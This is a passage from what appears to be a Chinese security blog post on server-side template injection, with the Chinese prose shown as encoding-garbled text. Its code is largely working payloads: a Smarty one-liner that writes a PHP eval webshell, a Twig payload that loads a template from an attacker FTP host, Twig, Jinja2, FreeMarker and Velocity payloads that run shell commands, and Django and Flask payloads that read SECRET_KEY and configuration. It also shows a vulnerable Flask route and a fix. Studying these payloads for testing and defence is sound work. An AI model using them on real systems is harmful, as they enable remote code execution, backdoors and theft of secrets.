class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadå†™ä¸ªwebshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure><h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>ç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ <code>self::</code> è°ƒç”¨é™æ€å˜é‡äº†ï¼Œä½†æ˜¯ é€šè¿‡<a href="https://twig.symfony.com/doc/2.x/templates.html">å®˜æ–¹æ–‡æ¡£</a>çš„æŸ¥è¯¢ï¼šTwig ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ª <code>_self</code>, è™½ç„¶ <code>_self</code> æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ª envã€‚</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Twig_env.png" style="zoom:67%;"><p>envæ˜¯æŒ‡å±æ€§Twig_Environmentå¯¹è±¡ï¼ŒTwig_Environmentå¯¹è±¡æœ‰ä¸€ä¸ª setCacheæ–¹æ³•å¯ç”¨äºæ›´æ”¹Twigå°è¯•åŠ è½½å’Œæ‰§è¡Œç¼–è¯‘æ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä½ç½®(ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®˜æ–¹æ–‡æ¡£æ²¡æœ‰çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œåæ¥æ‰¾åˆ°äº†Twig çš„æºç ä¸­çš„ environment.phpï¼‰</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Twig_setCache.png" style="zoom:67%;"><p>å› æ­¤ï¼Œæ˜æ˜¾çš„æ”»å‡»æ˜¯é€šè¿‡å°†ç¼“å­˜ä½ç½®è®¾ç½®ä¸ºè¿œç¨‹æœåŠ¡å™¨æ¥å¼•å…¥è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½†æ˜¯æ–°çš„é—®é¢˜å‡ºç°äº†</strong>ï¼Œ<code>allow_url_include</code> ä¸€èˆ¬æ˜¯ä¸æ‰“å¼€çš„ï¼Œæ²¡æ³•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ²¡å…³ç³»è¿˜æœ‰ä¸ªè°ƒç”¨è¿‡æ»¤å™¨çš„å‡½æ•° <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†ä¸€ä¸ª <code>call_user_function</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> $callback) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="comment">//æ³¨æ„è¿™è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params">$callable</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filterCallbacks[] = $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªè¦æŠŠexec() ä½œä¸ºå›è°ƒå‡½æ•°ä¼ è¿›å»å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œäº†</p><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹å¾ˆæ˜æ˜¾å°±æ˜¯ emailï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„èƒ½åŠ›å·²ç»è¢«é™åˆ¶çš„å¾ˆæ­»ï¼Œå¾ˆéš¾æ‰§è¡Œå‘½ä»¤ï¼Œä½†åˆæƒ³è·å–å’Œ User æœ‰å…³çš„é…ç½®ä¿¡æ¯çš„è¯ï¼Œæ€ä¹ˆåŠï¼Ÿ</p><p>å¯ä»¥å‘ç°æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°çš„åªæœ‰æœ‰ä¸€ä¸ª å’Œuser æœ‰å…³çš„å˜é‡ï¼Œé‚£å°±æ˜¯ request user ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>pç‰›åœ¨è‡ªå·±çš„åšå®¢ä¸­åˆ†äº«äº†è¿™ä¸ªæ€è·¯ï¼Œæˆ‘æŠŠå®ƒå¼•ç”¨è¿‡æ¥ï¼š</p><blockquote><p>Djangoæ˜¯ä¸€ä¸ªåºå¤§çš„æ¡†æ¶ï¼Œå…¶æ•°æ®åº“å…³ç³»é”™ç»¼å¤æ‚ï¼Œæˆ‘ä»¬å…¶å®æ˜¯å¯ä»¥é€šè¿‡å±æ€§ä¹‹é—´çš„å…³ç³»å»ä¸€ç‚¹ç‚¹æŒ–æ˜æ•æ„Ÿä¿¡æ¯ã€‚ä½†Djangoä»…ä»…æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œåœ¨æ²¡æœ‰ç›®æ ‡æºç çš„æƒ…å†µä¸‹å¾ˆéš¾å»æŒ–æ˜ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯å°±æ˜¯ï¼šå»æŒ–æ˜Djangoè‡ªå¸¦çš„åº”ç”¨ä¸­çš„ä¸€äº›è·¯å¾„ï¼Œæœ€ç»ˆè¯»å–åˆ°Djangoçš„é…ç½®é¡¹</p></blockquote><p>ä»€ä¹ˆæ„æ€ï¼Œç®€å•åœ°è¯´å°±æ˜¯æˆ‘ä»¬åœ¨æ²¡æœ‰åº”ç”¨æºç çš„æƒ…å†µä¸‹è¦å­¦ä¼šå»å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å±æ€§ï¼Œçœ‹è¿™ä¸ªç©ºæ¡†æ¶æœ‰ä»€ä¹ˆå±æ€§å’Œç±»ä¹‹é—´çš„å¼•ç”¨ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥çš„é è¿‘æˆ‘ä»¬çš„ç›®æ ‡</p><p>åæ¥å‘ç°Djangoè‡ªå¸¦çš„åº”ç”¨â€œadminâ€ï¼ˆä¹Ÿå°±æ˜¯Djangoè‡ªå¸¦çš„åå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/django-seetings.png" style="zoom:80%;"><p>æ‰€ä»¥ï¼Œæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šæˆ‘ä»¬åªéœ€è¦é€šè¿‡æŸç§æ–¹å¼ï¼Œæ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><h4 id="Flask-jinja2"><a href="#Flask-jinja2" class="headerlink" title="Flask/jinja2"></a>Flask/jinja2</h4><p>Flaskæ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚å…¶ WSGI å·¥å…·ç®±é‡‡ç”¨ Werkzeug ï¼Œæ¨¡æ¿å¼•æ“åˆ™ä½¿ç”¨ Jinja2</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/hello-template-injection&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span>():</span></span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span> % person[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_file</span>(<span class="params">f_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line">    </span><br><span class="line">app.jinja_env.globals[<span class="string">&#x27;get_user_file&#x27;</span>] = get_user_file</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥SSTIå°†secretæ³„éœ²å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello-template-injection?name&#x3D;MoonBack.&#123;&#123;person.secret&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIMæˆªå›¾20200216182714.png" style="zoom:80%;"><p>åŒæ ·æˆ‘ä»¬å¯ä»¥ç”¨<code>get_user_file</code>è¯»å–æ–‡ä»¶</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIMæˆªå›¾20200216182934.png" style="zoom:80%;"><p>å‡è®¾æˆ‘ä»¬ç”¨ä¸‹é¢çš„payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;ipconfig&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIMæˆªå›¾20200223174026.png" style="zoom:80%;"><p>è€Œæ¼æ´ç‚¹å°±å­˜åœ¨äºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span> % person[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> render_template_string(template, person=person)</span><br></pre></td></tr></table></figure><p>å¦‚æœæ”¹æˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/hello-template-injection&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span>():</span></span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,title=<span class="string">&#x27;Home&#x27;</span>,username=person[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>å†åœ¨<code>templates</code>ç›®å½•é‡Œå†™å…¥<code>index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216213545.png"></p><p>å†è®¿é—®å‘ç°å°±æ²¡èƒ½æˆåŠŸè§£æå‡ºsecret</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIMæˆªå›¾20200216213413.png" style="zoom: 67%;"><p><strong>æ¼æ´æˆå› åœ¨äº</strong>ï¼š<code>render_template_string</code>å‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ä½¿ç”¨äº†%sæ¥åŠ¨æ€çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“Flask ä¸­ä½¿ç”¨äº†Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œä¸¤ä¸ªå¤§æ‹¬å·åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠä¸¤ä¸ªå¤§æ‹¬å·åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚</p><h5 id="è·å–å…¨å±€é…ç½®æ–‡ä»¶"><a href="#è·å–å…¨å±€é…ç½®æ–‡ä»¶" class="headerlink" title="è·å–å…¨å±€é…ç½®æ–‡ä»¶"></a>è·å–å…¨å±€é…ç½®æ–‡ä»¶</h5><p>configæ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€å½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼ŒSECRET_KEYç­‰æ•æ„Ÿå€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;person.secret&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h5><p>ç›´æ¥ç”¨Vlunhubä¸Šçš„expï¼š<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>å‚è§æŠ¤ç½‘æ¯çš„ä¸€é“é¢˜ï¼š<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h4><p>è¿™ä¸ªæ¨¡æ¿ä¸»è¦ç”¨äº java ,ç²—ç•¥å¾—çŸ¥newä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ç° TemplateModel æ¥ç”¨ new åˆ›å»ºä»»æ„ Java å¯¹è±¡</p><p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216163834.png"></p><p>payloadï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line"></span><br><span class="line">&lt;#assignob=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure><h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>Velocity åŒæ ·æ˜¯ä¸€æ¬¾å¤‡å—æ¬¢è¿çš„æ¨¡æ¿è¯­è¨€ã€‚ç„¶è€Œå®ƒæ²¡æœ‰é»˜è®¤å˜é‡åˆ—è¡¨å’Œ <em>å®‰å…¨é—®é¢˜</em> é¡µé¢å¸®åŠ©æˆ‘ä»¬æ„å»º payloadã€‚ä¸‹é¢å±•ç¤ºäº† Burp Intruder åœ¨æšä¸¾å˜é‡åæ—¶çš„æˆªå›¾ï¼šï¼ˆå˜é‡ååœ¨ payload è¡Œï¼ŒæœåŠ¡å™¨ç»“æœåœ¨å…¶å³è¾¹ï¼‰ï¼š</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-variable-bruteforce.png" style="zoom:150%;"><p>è¿™å¹…å›¾ä¸­ï¼Œè¢«é«˜äº®çš„ class èƒ½è¿”å›å¯¹è±¡ï¼Œçœ‹ä¸Šå»ååˆ†æœ‰è¶£ã€‚è°·æ­Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å‘ç°äº†<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">å¦‚ä¸‹æè¿°</a>ï¼š<br>ClassToolï¼šåœ¨æ¨¡æ¿ä¸­å®ç°Javaçš„åå°„ï¼Œé»˜è®¤å‚æ•°ï¼š$key</p><p>è¿™é‡Œæœ‰å‡ ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§ï¼š<br>$class.inspect(class/object/string)ï¼šè¿”å›æ­£åœ¨å®¡æŸ¥ç±»æˆ–å¯¹è±¡çš„ClassToolå®ä¾‹<br>$class.typeï¼šè¿”å›è¢«å®¡æŸ¥çš„ç±»</p><p>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªç±»è·å¾—ä»»æ„å¯¹è±¡ä¿¡æ¯ã€‚å†åˆ©ç”¨ç›®æ ‡çš„Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤å—¯ã€‚é€šè¿‡å¦‚ä¸‹æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯è¿™ä¸€ç‚¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep <span class="number">5</span><span class="string">&quot;).waitFor() //å»¶è¿Ÿäº†5ç§’</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ° shell å‘½ä»¤è¾“å‡ºæœ‰ç‚¹éº»çƒ¦ï¼ˆæ¯•ç«Ÿjavaï¼‰ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¾“å‡º tomcat7</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
